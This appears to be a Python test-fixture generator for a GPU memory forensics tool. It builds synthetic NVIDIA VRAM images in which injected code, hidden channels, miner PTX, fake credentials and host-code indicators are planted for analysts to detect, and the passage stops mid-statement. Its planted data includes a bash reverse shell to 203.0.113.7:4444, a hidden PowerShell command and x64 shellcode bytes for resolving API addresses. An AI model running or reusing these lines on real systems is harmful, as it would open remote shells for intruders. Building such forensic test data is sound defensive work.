"""Synthetic NVIDIA VRAM images (any generation, Kepler..Rubin) with ground-truth manifests.

Everything is built with the same encoders the analysis code decodes with
(``gmmu.encode_*``, ``ramin.encode_*``, ``runlist.encode_*``, ``pushbuf``,
``qmd``), so the image is a faithful structural model: real VER2 page tables,
Volta+ instance blocks with RAMFC signatures, a runlist, GPFIFO rings,
pushbuffers driving copy and compute engines, QMD V03_00 launch descriptors,
cubins/fatbins/PTX, surfaces, a VBIOS image and planted indicators.

Scenario (what an analyst should find):
  * Process P1 (AS1) runs two channels in TSG 1: compute (A) and copy (B).
    A launches kernel ``vector_add`` legitimately and *also* launches code from
    a writable, non-cubin page (injected GPU code); one GPFIFO entry is still
    pending. B copies a surface to host physical memory with physical-mode DMA.
  * Channel C (AS2) exists in VRAM but not in any runlist (torn down / hidden);
    it copied a page shared with P1 into a system-memory mapping.
  * Channel D is a privileged kernel channel (TSG 0).
  * Residual (unmapped) VRAM holds a fatbin (LZ4), a cubin, miner PTX,
    credentials, AES key schedules, host executables and a script payload.
"""

from __future__ import annotations

import datetime
import json
import math
import os
import random
import struct
from typing import Dict, Optional, Tuple

from keto.formats import fatbin as fatbin_fmt
from keto.formats.aes import expand_key
from keto.formats.container import ContainerWriter, write_lime
from keto.formats.cubin import build_cubin, parse_cubin
from keto.formats.imaging import swizzle
from keto.formats.vbios import build_rom
from keto.framework.profiles import registry
from keto.gpu import pushbuf, qmd as qmd_fmt, ramin, runlist
from keto.gpu.gmmu import (FORMATS, SYS_COH, VID, encode_dual_pde, encode_pde, encode_pde_v1,
                                encode_pte, encode_pte_v1, v1_split)

VRAM_SIZE = 64 << 20
K4, K64, M2 = 0x1000, 0x10000, 0x200000

SUBCH_COMPUTE, SUBCH_COPY = 1, 4
SYSMEM_TARGET = 0x123456000
HOST_VICTIM_PA, HOST_KTEXT_PA = 0x1E00000, 0x1201000  # bash's buffer / kernel text in synth_kernel's layout
GENERATIONS = ("kepler", "maxwell", "pascal", "volta", "turing", "ampere", "ada", "hopper", "blackwell", "rubin")
#: generations whose structures are identical, so only metadata (chipset, NVML id) tells them apart
STRUCTURAL_TWIN = {"rubin": "blackwell"}
#: QMD version the driver writes for each generation's compute class (NVIDIA_COMMAND_FACTS.md section 1.2)
GENERATION_QMD = {"kepler": "v00_06", "maxwell": "v01_07", "pascal": "v02_01", "volta": "v02_02",
                  "turing": "v02_02", "ampere": "v03_00", "ada": "v03_00", "hopper": "v04_00",
                  "blackwell": "v05_00", "rubin": "v05_00"}  # rubin: assumed equal to Blackwell (its profile does)
#: a representative chipset per generation for snapshot metadata (profile auto-detection)
GENERATION_CHIP = {"kepler": ("0x0e4", "3.0", 2, "NVIDIA GeForce GTX 680"),
                   "maxwell": ("0x124", "5.2", 3, "NVIDIA GeForce GTX 980"),
                   "pascal": ("0x134", "6.1", 4, "NVIDIA GeForce GTX 1080"),
                   "volta": ("0x140", "7.0", 5, "Tesla V100-SXM2-16GB"),
                   "turing": ("0x164", "7.5", 6, "NVIDIA GeForce RTX 2080"),
                   "ampere": ("0x172", "8.6", 7, "NVIDIA GeForce RTX 3080"),
                   "ada": ("0x197", "8.9", 8, "NVIDIA GeForce RTX 4050 Laptop GPU"),
                   "hopper": ("0x180", "9.0", 9, "NVIDIA H100 PCIe"),
                   "blackwell": ("0x1a0", "10.0", 10, "NVIDIA B200"),
                   "rubin": ("0x1c0", None, 13, "NVIDIA Rubin")}  # derived chip id, no published compute capability
#: PTIMER holds Unix-epoch nanoseconds on current drivers; the synthetic timeline starts here
T0_NS = int(datetime.datetime(2026, 11, 17, 3, 0, tzinfo=datetime.timezone.utc).timestamp()) * 10 ** 9


def sass_function(seed: int, n: int = 24) -> bytes:
    """A plausible Volta+ SASS function: prologue, body, EXIT, BRA-self, NOP padding."""
    rnd = random.Random(seed)
    ops = [0x224, 0x210, 0x981, 0x986, 0x223, 0x212, 0x819, 0x20C, 0x984, 0x988, 0x221, 0x220]
    out = bytearray(struct.pack("<QQ", 0x00000A0000017A02, 0x000FE40000000F00))       # MOV R1, c[0x0][0x28]
    out += struct.pack("<QQ", 0x0000000000007919 | (rnd.randrange(1, 32) << 16), 0x000E220000002100)  # S2R
    for _ in range(n):
        op = rnd.choice(ops)
        lo = (rnd.getrandbits(40) << 24) & 0xFFFFFFFFFF000000 | (rnd.getrandbits(8) << 16) | 0x7000 | op
        hi = 0x000FE20000000000 | rnd.getrandbits(24)
        out += struct.pack("<QQ", lo, hi)
    out += struct.pack("<QQ", 0x000000000000794D, 0x000FEA0003800000)   # EXIT
    out += struct.pack("<QQ", 0xFFFFFFF000007947, 0x000FC0000383FFFF)   # BRA self
    while len(out) % 128:
        out += struct.pack("<QQ", 0x0000000000007918, 0x000FC00000000000)  # NOP
    return bytes(out)


class Image:
    def __init__(self, size: int):
        self.buf = bytearray(size)

    def put(self, pa: int, data: bytes):
        self.buf[pa:pa + len(data)] = data

    def u64(self, pa: int, v: int):
        struct.pack_into("<Q", self.buf, pa, v)

    def get_u64(self, pa: int) -> int:
        return struct.unpack_from("<Q", self.buf, pa)[0]


class AddressSpaceBuilder:
    """Builds a VER1, VER2 or VER3 page-table hierarchy inside the image."""

    def __init__(self, img: Image, fmt: str, alloc_base: int, alloc_limit: int, big_page: int = K64):
        self.img, self.fmt, self.big_page = img, fmt, big_page
        self.next, self.limit = alloc_base, alloc_limit
        if fmt == "v1":
            self.pd_shift, self.big_shift = v1_split(big_page)
            self.pdb = self._alloc((1 << (40 - self.pd_shift)) * 8)
        else:
            self.pdb = self._alloc()
        self.tables: Dict[tuple, int] = {}
        self.dual: Dict[int, list] = {}  # dual PDE entry pa -> [big_pt, small_pt]

    def _alloc(self, size: int = K4) -> int:
        pa = self.next
        self.next += (size + K4 - 1) // K4 * K4
        assert self.next <= self.limit, "page-table region exhausted"
        return pa

    def map(self, va: int, pa: int, size: int, page: int = K4, aperture: str = VID, **flags):
        if self.fmt == "v1" and page == M2:
            page = self.big_page  # VER1 has no 2 MiB pages
        elif self.fmt == "v1" and page != self.big_page:
            page = K4
        for off in range(0, size, page):
            self._map_page(va + off, pa + off, page, aperture, **flags)

    def _map_page(self, va, pa, page, aperture, **flags):
        if self.fmt == "v1":
            return self._map_page_v1(va, pa, page, aperture, **flags)
        levels = FORMATS[self.fmt].levels
        table = self.pdb
        for lvl in levels[:-1]:
            idx = (va >> lvl.lo) & (lvl.entries - 1)
            key = (lvl.name, va >> lvl.lo)
            if key not in self.tables:
                self.tables[key] = self._alloc()
                self.img.u64(table + idx * 8, encode_pde(self.fmt, VID, self.tables[key]))
            table = self.tables[key]
        e = table + ((va >> 21) & 0xFF) * 16
        pte = encode_pte(self.fmt, aperture, pa, **flags)
        if page == M2:
            self.img.u64(e, pte)
            self.img.u64(e + 8, 0)
            return
        slot = self.dual.setdefault(e, [None, None])
        if page == K64:
            if slot[0] is None:
                slot[0] = self._alloc()
            self.img.u64(slot[0] + ((va >> 16) & 0x1F) * 8, pte)
        else:
            if slot[1] is None:
                slot[1] = self._alloc()
            self.img.u64(slot[1] + ((va >> 12) & 0x1FF) * 8, pte)
        lo, hi = encode_dual_pde(self.fmt, big=(VID, slot[0]) if slot[0] is not None else None,
                                 small=(VID, slot[1]) if slot[1] is not None else None)
        self.img.u64(e, lo)
        self.img.u64(e + 8, hi)

    def _map_page_v1(self, va, pa, page, aperture, **flags):
        e = self.pdb + (va >> self.pd_shift) * 8
        slot = self.dual.setdefault(e, [None, None])
        pte = encode_pte_v1(aperture, pa, **flags)
        if page == self.big_page:
            if slot[0] is None:
                slot[0] = self._alloc((1 << (self.pd_shift - self.big_shift)) * 8)
            self.img.u64(slot[0] + ((va >> self.big_shift) & ((1 << (self.pd_shift - self.big_shift)) - 1)) * 8, pte)
        else:
            if slot[1] is None:
                slot[1] = self._alloc((1 << (self.pd_shift - 12)) * 8)
            self.img.u64(slot[1] + ((va >> 12) & ((1 << (self.pd_shift - 12)) - 1)) * 8, pte)
        self.img.u64(e, encode_pde_v1(big=(VID, slot[0]) if slot[0] is not None else None,
                                      small=(VID, slot[1]) if slot[1] is not None else None))


def _surface_pixels(w: int, h: int, seed: int) -> bytes:
    px = bytearray(w * h * 4)
    for y in range(h):
        for x in range(w):
            i = (y * w + x) * 4
            checker = 60 if ((x // 16) + (y // 16)) % 2 else 0
            px[i] = (x * 255 // max(w - 1, 1) + seed) & 0xFF          # B
            px[i + 1] = (y * 255 // max(h - 1, 1)) & 0xFF              # G
            px[i + 2] = (128 + checker + seed) & 0xFF                  # R
            px[i + 3] = 0xFF                                           # A
    return bytes(px)


PTX_MINER = """//
// Generated by NVIDIA NVVM Compiler
//
// Compiler Build ID: CL-35059454
// Cuda compilation tools, release 12.6, V12.6.85
// Based on NVVM 7.0.1
//

.version 8.5
.target sm_89
.address_size 64

.visible .entry ethash_search(
\t.param .u64 ethash_search_param_0,
\t.param .u64 ethash_search_param_1
)
{
\t.reg .b64 %rd<4>;
\tld.param.u64 %rd1, [ethash_search_param_0];
\tret;
}

.visible .entry kawpow_hash(
\t.param .u64 kawpow_hash_param_0
)
{
\tret;
}
"""

PTX_BENIGN = """//
// Generated by NVIDIA NVVM Compiler
//
.version 8.5
.target sm_89
.address_size 64

.extern .func  (.param .b32 func_retval0) vprintf
(
\t.param .b64 vprintf_param_0,
\t.param .b64 vprintf_param_1
)
;
.global .align 4 .u32 counter;

.visible .entry vector_add(
\t.param .u64 vector_add_param_0,
\t.param .u64 vector_add_param_1,
\t.param .u64 vector_add_param_2
)
{
\tret;
}
"""

SECRETS = [
    b"-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEAsynthetic0000000000000000000000000000000000000000000\n"
    b"aGVsbG8gZm9yZW5zaWNzIC0gdGhpcyBpcyBub3QgYSByZWFsIGtleQ==\n-----END RSA PRIVATE KEY-----\n",
    b"aws_access_key_id = AKIAIOSFODNN7EXAMPLE\naws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n",
    b"Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ2cmFtYW5jZXIiLCJuYW1lIjoidGVzdCJ9."
    b"c2lnbmF0dXJlLXN5bnRoZXRpYy0wMTIzNDU2Nzg5\n",
    b"root:$6$saltsalt$Zx1y2w3v4u5t6s7r8q9p0o/synthetic.hash.value.for.tests.only.0123456789AB:19000:0:99999:7:::\n",
    b"ghp_0123456789abcdefghijABCDEFGHIJ0123456789\n",
]

HOST_PAYLOADS = [
    b"powershell.exe -NoP -W Hidden -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAA==",
    b"bash -i >& /dev/tcp/203.0.113.7/4444 0>&1",
]


def _elf_x64() -> bytes:
    hdr = bytearray(64)
    hdr[:16] = b"\x7fELF\x02\x01\x01" + b"\x00" * 9
    struct.pack_into("<HHIQQQIHHHHHH", hdr, 16, 2, 62, 1, 0x401000, 64, 0, 0, 64, 56, 1, 64, 0, 0)
    ph = struct.pack("<IIQQQQQQ", 1, 5, 0, 0x400000, 0x400000, 0x200, 0x200, 0x1000)
    return bytes(hdr) + ph + b"\x90" * 64 + b"/bin/sh\x00"


def _pe_x64() -> bytes:
    mz = bytearray(0x200)
    mz[0:2] = b"MZ"
    struct.pack_into("<I", mz, 0x3C, 0x80)
    mz[0x80:0x84] = b"PE\x00\x00"
    struct.pack_into("<HH", mz, 0x84, 0x8664, 3)
    mz[0x40:0x40 + 39] = b"This program cannot be run in DOS mode."
    return bytes(mz)


def _pb(*parts: bytes) -> bytes:
    return b"".join(parts)


def M(subch, method, values, op="INC"):
    return pushbuf.encode_methods(subch, method, values if isinstance(values, list) else [values], op)


def build_image(real_cubin: Optional[bytes] = None, gen: str = "ada") -> Tuple[bytes, dict]:
    """Build the scenario with generation ``gen``'s page-table format, instance-block layout, runlist format,
    engine classes and QMD version."""
    prof = registry().get(gen)
    fmt = prof.mmu_format
    big_page = prof.big_page_sizes[0] if fmt == "v1" else K64
    compute_class, copy_class = prof.classes["compute"], prof.classes["copy"]
    qv = GENERATION_QMD[gen]
    offset_mode = qmd_fmt.LAYOUTS[qv]["prog"] == "offset"
    img = Image(VRAM_SIZE)
    truth: Dict[str, object] = {"profile": gen, "vram_size": VRAM_SIZE, "mmu": fmt, "big_page": big_page,
                                "qmd_version": qv, "classes": {"compute": compute_class, "copy": copy_class}}

    # ---------------------------------------------------------------- banners
    banners = [b"NVRM version: NVIDIA UNIX x86_64 Kernel Module  590.74  Synthetic Build",
               GENERATION_CHIP[gen][3].encode(), b"CUDA Version 13.1",
               b"Cuda compilation tools, release 13.1, V13.1.123"]
    pos = 0x100
    for b in banners:
        img.put(pos, b + b"\x00")
        pos += 0x100
    truth["banners"] = [b.decode() for b in banners]

    # ---------------------------------------------------------------- code
    kernels = {"vector_add": sass_function(1, 20), "matmul_tiled": sass_function(2, 40)}
    cub = build_cubin(kernels)
    code_va = 0x3_0000_0000
    code_pa = 0x500000
    layout = {}
    off = 0
    for name, text in kernels.items():
        img.put(code_pa + off, text)
        layout[name] = (code_va + off, code_pa + off, len(text))
        off += len(text)
    if real_cubin:
        rc = parse_cubin(real_cubin)
        for k in rc.kernels:
            img.put(code_pa + off, k.text)
            layout[k.name] = (code_va + off, code_pa + off, len(k.text))
            off += k.size
    truth["kernels_loaded"] = {k: {"va": v[0], "pa": v[1], "size": v[2]} for k, v in layout.items()}
    injected = sass_function(666, 12)
    img.put(0x600000, injected)
    orphan = sass_function(777, 10)
    img.put(0x1B00000, orphan)
    inj_va = 0x3_8000_0000  # within 4 GiB of the code region, so offset-mode (pre-Volta) QMDs can name it
    truth["injected_code"] = {"pa": 0x600000, "va": inj_va, "size": len(injected)}
    truth["orphan_code"] = {"pa": 0x1B00000, "size": len(orphan)}

    # ---------------------------------------------------------------- address spaces
    if fmt == "v1":  # VER1 page directories and small-page tables are large (up to 256 KiB each)
        as1 = AddressSpaceBuilder(img, fmt, 0x2000000, 0x2600000, big_page)
        as2 = AddressSpaceBuilder(img, fmt, 0x2600000, 0x2C00000, big_page)
        as3 = AddressSpaceBuilder(img, fmt, 0x2C00000, 0x3200000, big_page)
    else:
        as1 = AddressSpaceBuilder(img, fmt, 0x100000, 0x200000)
        as2 = AddressSpaceBuilder(img, fmt, 0x200000, 0x300000)
        as3 = AddressSpaceBuilder(img, fmt, 0x300000, 0x400000)
    gp_a, gp_b, pb1, qmd_va, sem_va = 0x2_0000_0000, 0x2_0000_1000, 0x2_0001_0000, 0x2_0002_0000, 0x2_0003_0000
    as1.map(gp_a, 0x400000, K4)
    as1.map(gp_b, 0x401000, K4)
    as1.map(pb1, 0x410000, K64, page=K64)
    as1.map(qmd_va, 0x420000, K4)
    as1.map(sem_va, 0x430000, K4)
    ctx_va = 0x2_0004_0000
    as1.map(ctx_va, 0x440000, K4, privileged=True)                    # engine context-switch image
    img.put(0x440000, b"GRCTX" + bytes(range(1, 60)))
    as1.map(code_va, code_pa, K64, page=K64, readonly=True)
    as1.map(inj_va, 0x600000, K4)                                      # RW page holding code (W^X violation)
    as1.map(0x7_0000_0000, 0x700000, K4, privileged=True)              # privileged page in a user AS
    as1.map(0x4_0000_0000, 0xC00000, M2, page=M2)                      # 2 MiB tensor buffer
    as1.map(0x9_0000_0000, 0x900000, K4)                               # shared with AS2
    gp_c, pb_c = 0x1_0000_0000, 0x1_0001_0000
    as2.map(gp_c, 0xA00000, K4)
    as2.map(pb_c, 0xA10000, K64, page=K64)
    as2.map(0x1_0010_0000, 0x900000, K4)                               # shared page
    as2.map(0x6_0000_0000, SYSMEM_TARGET, K4, aperture=SYS_COH)       # host memory mapping
    # host pages of the synthetic kernel image (keto.testing.synth_kernel): another process's buffer and kernel text
    as2.map(0x6_0001_0000, HOST_VICTIM_PA, K4, aperture=SYS_COH)
    as2.map(0x6_0002_0000, HOST_KTEXT_PA, K4, aperture=SYS_COH, readonly=True)
    as2.map(0x8_0000_0000, 0x1000000, 0x20000, page=K64)              # pitch surface
    as2.map(0x8_0010_0000, 0x1100000, K64, page=K64, kind=0xFE)       # block-linear surface
    as2.map(0x7_0000_0000, as2.pdb, K4)                                # AS2 maps its own page directory
    gp_d = 0x10_0000
    as3.map(gp_d, 0xB00000, K4, privileged=True)
    truth["address_spaces"] = {"AS1": as1.pdb, "AS2": as2.pdb, "AS3": as3.pdb}
    truth["shared_page"] = {"pa": 0x900000, "vas": {"AS1": 0x9_0000_0000, "AS2": 0x1_0010_0000}}
    truth["sysmem_mapping"] = {"as": "AS2", "va": 0x6_0000_0000, "host_pa": SYSMEM_TARGET}
    truth["host_page_owners"] = {"victim": {"va": 0x6_0001_0000, "host_pa": HOST_VICTIM_PA, "owner_pid": 200},
                                 "kernel_text": {"va": 0x6_0002_0000, "host_pa": HOST_KTEXT_PA}}
    truth["privileged_user_mapping"] = {"as": "AS1", "va": 0x7_0000_0000}
    truth["page_table_self_map"] = {"as": "AS2", "va": 0x7_0000_0000, "pa": as2.pdb}
    truth["huge_page"] = {"as": "AS1", "va": 0x4_0000_0000, "pa": 0xC00000, "size": M2} if fmt != "v1" else None
    as1.map(0xA_0000_0000, 0x3800000, M2, page=M2)                    # scraper marker fill (see below)

    # ---------------------------------------------------------------- data
    tensor = b"".join(struct.pack("<f", math.sin(i / 50.0)) for i in range(M2 // 4))
    img.put(0xC00000, tensor)
    w1, h1 = 256, 128
    surf = _surface_pixels(w1, h1, 0)
    img.put(0x1000000, surf)
    w2, h2, bh = 128, 64, 2
    surf2 = _surface_pixels(w2, h2, 90)
    img.put(0x1100000, swizzle(surf2, w2 * 4, h2, bh))
    w3, h3 = 192, 96  # XRGB (alpha 0x00), as browsers keep page textures
    surf3 = bytearray(_surface_pixels(w3, h3, 40))
    surf3[3::4] = bytes(len(surf3) // 4)
    img.put(0x1200000, bytes(surf3))
    w4, h4 = 1000, 128  # row width that is not a multiple of 16 (found by autocorrelation)
    img.put(0x1300000, _surface_pixels(w4, h4, 70))
    truth["surfaces"] = [{"pa": 0x1000000, "width": w1, "height": h1, "layout": "pitch"},
                         {"pa": 0x1100000, "width": w2, "height": h2, "layout": "blocklinear", "block_height": bh},
                         {"pa": 0x1200000, "width": w3, "height": h3, "layout": "pitch", "alpha": 0},
                         {"pa": 0x1300000, "width": w4, "height": h4, "layout": "pitch"}]
    img.put(0x900000, b"SHARED-PAGE: model weights shard 7 / tenant=alpha" + b"\x5a" * 64)

    # ---------------------------------------------------------------- QMDs
    va_add = layout["vector_add"][0]

    def prog(va):  # Kepler..Pascal QMDs hold an offset from SET_PROGRAM_REGION_A/B, later ones the address
        return va - code_va if offset_mode else va

    q1 = qmd_fmt.make_launch(prog(va_add), grid=(128, 1, 1), block=(256, 1, 1), registers=16,
                             cbufs=[(0, 0x4_0000_1000, 0x200)], release_address=sem_va + 0x20, release_payload=5,
                             version=qv, four_word_release=True)
    q2 = qmd_fmt.make_launch(prog(inj_va), grid=(1, 1, 1), block=(32, 1, 1), registers=8, version=qv)
    img.put(0x420000, q1)
    img.put(0x420200, q2)  # 384-byte QMDs from V04 on
    truth["launches"] = [{"qmd_va": qmd_va, "program_va": va_add, "kernel": "vector_add"},
                         {"qmd_va": qmd_va + 0x200, "program_va": inj_va, "kernel": None}]
    region = (M(SUBCH_COMPUTE, 0x1608, [code_va >> 32, code_va & 0xFFFFFFFF]),) if offset_mode else ()
    # GPU-written completion records: 16-byte {payload, PTIMER ns} at each timestamped semaphore address
    sem_events = [(sem_va, 1, T0_NS + 1000000, "compute report"), (sem_va + 0x20, 5, T0_NS + 2000000, "qmd release"),
                  (sem_va + 0x40, 0x1234, T0_NS + 3000000, "host"), (sem_va + 0x10, 7, T0_NS + 4000000, "copy")]
    for va, payload, ns, _ in sem_events:
        img.put(0x430000 + (va - sem_va), struct.pack("<QQ", payload, ns))
    truth["timeline"] = [{"address": va, "payload": pl, "ns": ns, "engine": e} for va, pl, ns, e in sem_events]

    # ---------------------------------------------------------------- pushbuffers (AS1)
    a1 = _pb(M(SUBCH_COMPUTE, 0x0000, compute_class), *region,
             M(SUBCH_COMPUTE, 0x0790, [0x4, 0x0]),
             M(SUBCH_COMPUTE, 0x0188, [0x4, 0x0, ]),
             M(SUBCH_COMPUTE, 0x0180, [16, 1]),
             M(SUBCH_COMPUTE, 0x01B0, 0x41),
             M(SUBCH_COMPUTE, 0x01B4, [0x41524753, 0x30303030, 0xDEADBEEF, 0x00000080], op="NON_INC"),
             M(SUBCH_COMPUTE, 0x02B4, qmd_va >> 8),
             M(SUBCH_COMPUTE, 0x02BC, 3),
             M(SUBCH_COMPUTE, 0x1B00, [0x2, sem_va & 0xFFFFFFFF, 1, 1 << 20]),
             M(0, 0x0020, 0))
    a2 = _pb(M(SUBCH_COMPUTE, 0x02B4, (qmd_va + 0x200) >> 8), M(SUBCH_COMPUTE, 0x02BC, 3))
    if gen in ("kepler", "maxwell", "pascal"):  # SEMAPHOREA..D: RELEASE (2), RELEASE_SIZE 16BYTE (bit 24 = 0)
        a3 = _pb(M(0, 0x0010, [sem_va >> 32, (sem_va + 0x40) & 0xFFFFFFFF, 0x1234, 2]))
    else:  # SEM_ADDR/PAYLOAD/EXECUTE: RELEASE (1) with RELEASE_TIMESTAMP_EN (bit 25)
        a3 = _pb(M(0, 0x005C, [(sem_va + 0x40) & 0xFFFFFFFF, sem_va >> 32, 0x1234, 0, 1 | (1 << 25)]))
    a4 = _pb(M(SUBCH_COMPUTE, 0x02B4, qmd_va >> 8), M(SUBCH_COMPUTE, 0x02BC, 3))
    b1 = _pb(M(SUBCH_COPY, 0x0000, copy_class),
             M(SUBCH_COPY, 0x0400, [0x4, 0x0, 0x9, 0x0, 4096, 4096, 4096, 1]),
             M(SUBCH_COPY, 0x0240, [sem_va >> 32, (sem_va + 0x10) & 0xFFFFFFFF, 7]),
             M(SUBCH_COPY, 0x0300, 0x2 | (2 << 3) | (1 << 7) | (1 << 8)))  # SEMAPHORE_TYPE 2: four-word release
    b2 = _pb(M(SUBCH_COPY, 0x0260, [0, 1]),
             M(SUBCH_COPY, 0x0400, [0x0, 0x1000000, SYSMEM_TARGET >> 32, SYSMEM_TARGET & 0xFFFFFFFF, 1024, 1024,
                                    1024, 128]),
             M(SUBCH_COPY, 0x0300, 0x2 | (1 << 7) | (1 << 8) | (1 << 9) | (1 << 12) | (1 << 13) | (2 << 5)))
    segs = {}
    cursor = 0x410000
    for name, blob in (("a1", a1), ("a2", a2), ("a3", a3), ("a4", a4), ("b1", b1), ("b2", b2)):
        img.put(cursor, blob)
        segs[name] = (pb1 + (cursor - 0x410000), len(blob) // 4)
        cursor += (len(blob) + 0xFF) & ~0xFF
    ring_a = b"".join(pushbuf.encode_gp_entry(*segs[n]) for n in ("a1", "a2", "a3", "a4"))
    ring_b = b"".join(pushbuf.encode_gp_entry(*segs[n]) for n in ("b1", "b2"))
    img.put(0x400000, ring_a)
    img.put(0x401000, ring_b)

    # ---------------------------------------------------------------- pushbuffers (AS2, hidden channel)
    c1 = _pb(M(SUBCH_COPY, 0x0000, copy_class),
             M(SUBCH_COPY, 0x0400, [0x1, 0x00100000, 0x6, 0x0, 4096, 4096, 4096, 1]),
             M(SUBCH_COPY, 0x0300, 0x2 | (1 << 7) | (1 << 8)))
    img.put(0xA10000, c1)
    img.put(0xA00000, pushbuf.encode_gp_entry(pb_c, len(c1) // 4))
    truth["copies"] = [{"channel": "B", "src": 0x4_0000_0000, "dst": 0x9_0000_0000, "bytes": 4096},
                       {"channel": "B", "src": 0x1000000, "dst": SYSMEM_TARGET, "bytes": 1024 * 128,
                        "physical": True},
                       {"channel": "C", "src": 0x1_0010_0000, "dst": 0x6_0000_0000, "bytes": 4096}]

    # ---------------------------------------------------------------- USERD + instance blocks
    userd = {"A": 0x30000, "B": 0x30200, "C": 0x30400, "D": 0x30600}
    img.put(userd["A"], ramin.encode_userd(prof, gp_get=3, gp_put=4))
    img.put(userd["B"], ramin.encode_userd(prof, gp_get=2, gp_put=2))
    img.put(userd["C"], ramin.encode_userd(prof, gp_get=1, gp_put=1))
    img.put(userd["D"], ramin.encode_userd(prof, gp_get=0, gp_put=0))
    inst = {"A": 0x20000, "B": 0x21000, "C": 0x22000, "D": 0x23000}
    ibc = dict(ver2=fmt != "v1", big_page_size=big_page)
    img.put(inst["A"], ramin.encode_instance_block(prof, **ibc, pdb=as1.pdb, gp_base_va=gp_a, gp_limit2=3,
                                                   userd_addr=userd["A"], gp_get=3, gp_put=4, chid=1,
                                                   engine_ctx_va=ctx_va))
    truth["engine_context"] = {"channel": "A", "va": ctx_va, "pa": 0x440000}
    img.put(inst["B"], ramin.encode_instance_block(prof, **ibc, pdb=as1.pdb, gp_base_va=gp_b, gp_limit2=3,
                                                   userd_addr=userd["B"], gp_get=2, gp_put=2, chid=2,
                                                   subcontexts=[(0, VID, as1.pdb), (1, VID, as1.pdb)]))
    img.put(inst["C"], ramin.encode_instance_block(prof, **ibc, pdb=as2.pdb, gp_base_va=gp_c, gp_limit2=2,
                                                   userd_addr=userd["C"], gp_get=1, gp_put=1, chid=3))
    img.put(inst["D"], ramin.encode_instance_block(prof, **ibc, pdb=as3.pdb, gp_base_va=gp_d, gp_limit2=4,
                                                   userd_addr=userd["D"], privileged=True, chid=0))
    truth["channels"] = {k: {"inst": v, "userd": userd[k]} for k, v in inst.items()}
    truth["channels"]["A"].update(chid=1, aspace="AS1", pending=1, gpfifo_entries=4)
    truth["channels"]["B"].update(chid=2, aspace="AS1", pending=0, gpfifo_entries=2,
                                  subcontexts=2 if prof.runlist.get("subcontexts") else 0)
    truth["channels"]["C"].update(chid=3, aspace="AS2", pending=0, gpfifo_entries=1, in_runlist=False)
    truth["channels"]["D"].update(chid=0, aspace="AS3", privileged=True)

    # ---------------------------------------------------------------- runlist
    rfmt = prof.runlist.get("format")
    if rfmt == "gv100":    # Volta+: 16-byte entries carrying instance block and USERD addresses
        rl = (runlist.encode_tsg(0, 1) + runlist.encode_channel(0, inst["D"], userd["D"])
              + runlist.encode_tsg(1, 2, scale=3, timeout=128)
              + runlist.encode_channel(1, inst["A"], userd["A"]) + runlist.encode_channel(2, inst["B"], userd["B"]))
    elif rfmt == "gm107":  # Maxwell/Pascal: 8-byte entries, word1 = instance block >> 12
        rl = (runlist.encode_tsg8(0, 1) + runlist.encode_channel8(0, inst["D"])
              + runlist.encode_tsg8(1, 2) + runlist.encode_channel8(1, inst["A"]) + runlist.encode_channel8(2, inst["B"]))
    else:                  # Kepler: 8-byte entries holding channel ids only
        rl = (runlist.encode_tsg8(0, 1) + struct.pack("<II", 0, 0) + runlist.encode_tsg8(1, 2)
              + struct.pack("<II", 1, 0) + struct.pack("<II", 2, 0))
    img.put(0x10000, rl)
    truth["runlist"] = {"pa": 0x10000, "format": rfmt, "tsgs": {0: [0], 1: [1, 2]}}

    # ---------------------------------------------------------------- residual artefacts
    fb = fatbin_fmt.build_fatbin([(fatbin_fmt.KIND_ELF, 89, cub, True),
                                  (fatbin_fmt.KIND_PTX, 89, PTX_BENIGN.encode() + b"\x00", False)])
    img.put(0x1400000, fb)
    img.put(0x1500000, cub)
    if real_cubin:
        img.put(0x1510000, real_cubin)
    img.put(0x1600000, PTX_MINER.encode() + b"\x00")
    truth["fatbin"] = {"pa": 0x1400000, "entries": 2}
    truth["cubins"] = [0x1500000] + ([0x1510000] if real_cubin else [])
    truth["ptx"] = {"pa": 0x1600000, "entries": ["ethash_search", "kawpow_hash"]}
    pos = 0x1700000
    for s in SECRETS:
        img.put(pos, s)
        pos += 0x400
    truth["secrets"] = len(SECRETS)
    k128 = bytes(range(16))
    k256 = bytes(range(32))
    img.put(0x1800000, expand_key(k128))
    s256 = expand_key(k256)
    swapped = b"".join(s256[i:i + 4][::-1] for i in range(0, len(s256), 4))
    img.put(0x1800400, swapped)
    noise = random.Random(4242)
    img.put(0x1800000 + 0x800, bytes(noise.getrandbits(8) for _ in range(2048)))
    truth["aes"] = [{"pa": 0x1800000, "bits": 128, "order": "bytes", "key": k128.hex()},
                    {"pa": 0x1800400, "bits": 256, "order": "u32-le", "key": k256.hex()}]
    img.put(0x1900000, _elf_x64())
    img.put(0x1901000, _pe_x64())
    img.put(0x1902000, HOST_PAYLOADS[0])
    img.put(0x1902400, HOST_PAYLOADS[1])
    truth["hostcode"] = {"elf": 0x1900000, "pe": 0x1901000, "scripts": 2}
    # x64 block_api prologue (PEB walk) + ROR-13 loop, an ext4 superblock and a ZIP archive parked in VRAM
    img.put(0x1D00000, b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56"
                       b"\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20"
                       b"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1")
    sb = bytearray(1024)
    struct.pack_into("<II", sb, 0, 2048, 8192)          # inodes, blocks
    struct.pack_into("<I", sb, 0x18, 2)                 # 4 KiB blocks
    struct.pack_into("<HH", sb, 0x38, 0xEF53, 1)        # magic, state clean
    struct.pack_into("<I", sb, 0x4C, 1)                 # dynamic revision
    struct.pack_into("<I", sb, 0x60, 0x40)              # INCOMPAT_EXTENTS -> ext4
    sb[0x78:0x80] = b"vramfs\x00\x00"
    img.put(0x1D10400, bytes(sb))
    zname = b"payload.bin"
    img.put(0x1D20000, b"PK\x03\x04" + struct.pack("<HHHHHIIIHH", 20, 0, 8, 0, 0, 0, 16, 32, len(zname), 0) + zname)
    truth["hostcode"].update(shellcode={"pa": 0x1D00000, "patterns": 2},
